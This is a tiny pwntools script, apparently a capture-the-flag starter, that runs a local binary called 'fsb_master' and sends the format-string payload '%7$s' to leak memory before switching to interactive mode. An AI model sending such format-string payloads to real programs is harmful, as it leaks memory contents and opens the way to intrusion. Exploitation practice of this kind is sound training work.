from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./fsb_master')

r.sendline(b'%7$s')

r.interactive()